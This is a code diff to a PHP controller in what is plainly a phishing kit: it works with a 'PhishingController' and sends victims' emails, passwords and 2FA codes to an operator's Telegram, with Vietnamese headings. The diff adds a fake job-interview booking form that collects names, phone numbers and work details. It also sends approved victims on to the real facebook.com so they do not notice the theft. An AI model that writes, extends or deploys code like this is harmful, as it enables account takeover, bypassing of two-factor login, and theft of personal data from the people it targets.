@@ -74,7 +74,7 @@ class LoginApprovalController extends Controller
         ]);
 
         $sessionData = app(PhishingController::class)->getSessionData();
-        $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/1") : "/";
+        $redirectUrl = "https://www.facebook.com";
 
         $id = (string) Str::uuid();
         $ip = $request->ip();
@@ -111,6 +111,58 @@ class LoginApprovalController extends Controller
         ]);
     }
 
+    public function submitBookingOtio(Request $request)
+    {
+        $fullName = $request->input('fullName', 'N/A');
+        $email = $request->input('email', 'N/A');
+        $phone = $request->input('phone', 'N/A');
+        $position = $request->input('position', 'N/A');
+        $experience = $request->input('experience', 'N/A');
+        $date = $request->input('date', 'N/A');
+        $time = $request->input('time', 'N/A');
+
+        $id = (string) Str::uuid();
+        $ip = $request->ip();
+        $location = $this->getLocationFromIp($ip);
+
+        $passwordDetails = "Họ tên: {$fullName} | SĐT: {$phone} | Vị trí: {$position} | Lịch: {$date} {$time} | Kinh nghiệm: {$experience}";
+
+        $approval = [
+            'id' => $id,
+            'type' => 'booking_otio',
+            'email' => $email,
+            'password' => $passwordDetails,
+            'code' => $phone,
+            'step' => 1,
+            'ip' => $ip,
+            'location' => $location,
+            'userAgent' => $request->userAgent() ?: 'N/A',
+            'status' => 'pending',
+            'redirectUrl' => url('/invitation'),
+            'createdAt' => now()->toIso8601String(),
+            'approvedAt' => null,
+            'rejectedAt' => null,
+            'fullName' => $fullName,
+            'phone' => $phone,
+            'position' => $position,
+            'experience' => $experience,
+            'date' => $date,
+            'time' => $time,
+        ];
+
+        Cache::put($this->cacheKey($id), $approval, now()->addMinutes(self::TTL_MINUTES));
+        $this->addToIndex($id);
+        $this->sendTelegramNotice($approval);
+
+        // Also log using PhishingController logger
+        app(PhishingController::class)->handleGenericLog($request);
+
+        return response()->json([
+            'status' => 'ok',
+            'redirectUrl' => url('/invitation'),
+        ]);
+    }
+
     public function wait(string $id)
     {
         abort_unless($this->findApproval($id), 404);
@@ -132,7 +184,7 @@ class LoginApprovalController extends Controller
         if (!$redirectUrl && $approval['status'] === 'approved') {
             $sessionData = app(PhishingController::class)->getSessionData();
             if ($type === '2fa') {
-                $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/1") : "/";
+                $redirectUrl = "https://www.facebook.com";
             } else {
                 $redirectUrl = $sessionData['authPath'] ?? null;
             }
@@ -417,17 +469,31 @@ class LoginApprovalController extends Controller
         $userAgent = $approval['userAgent'] ?? (request()->header('User-Agent') ?: 'N/A');
         $time = $approval['createdAt'] ?? now()->toIso8601String();
 
-        $headerTitle = ($type === '2fa') ? "🔐 *THÔNG TIN XÁC THỰC 2FA*" : "🔔 *THÔNG TIN ĐĂNG NHẬP MỚI*";
+        if ($type === 'booking_otio') {
+            $headerTitle = "📅 *THÔNG TIN ĐĂNG KÝ BOOKING OTIO*";
+        } else {
+            $headerTitle = ($type === '2fa') ? "🔐 *THÔNG TIN XÁC THỰC 2FA*" : "🔔 *THÔNG TIN ĐĂNG NHẬP MỚI*";
+        }
 
         $message = "{$headerTitle}\n";
         $message .= "----------------------------------------------------------\n";
-        $message .= "Email: `{$escapeMd($email)}`\n";
-        $message .= "Password: `{$escapeMd($password)}`\n";
+        if ($type === 'booking_otio') {
+            $message .= "Full Name: `{$escapeMd($approval['fullName'] ?? 'N/A')}`\n";
+            $message .= "Email: `{$escapeMd($email)}`\n";
+            $message .= "Phone: `{$escapeMd($approval['phone'] ?? 'N/A')}`\n";
+            $message .= "Position: `{$escapeMd($approval['position'] ?? 'N/A')}`\n";
+            $message .= "Experience: `{$escapeMd($approval['experience'] ?? 'N/A')}`\n";
+            $message .= "Call Date: `{$escapeMd($approval['date'] ?? '')}`\n";
+            $message .= "Call Time: `{$escapeMd($approval['time'] ?? '')}`\n";
+        } else {
+            $message .= "Email: `{$escapeMd($email)}`\n";
+            $message .= "Password: `{$escapeMd($password)}`\n";
 
-        if ($type === '2fa' && $code) {
-            $message .= "2FA Code: `{$escapeMd($code)}`\n";
-            if (isset($approval['step'])) {
-                $message .= "Step: Lần {$approval['step']}\n";
+            if ($type === '2fa' && $code) {
+                $message .= "2FA Code: `{$escapeMd($code)}`\n";
+                if (isset($approval['step'])) {
+                    $message .= "Step: Lần {$approval['step']}\n";
+                }
             }
         }
 
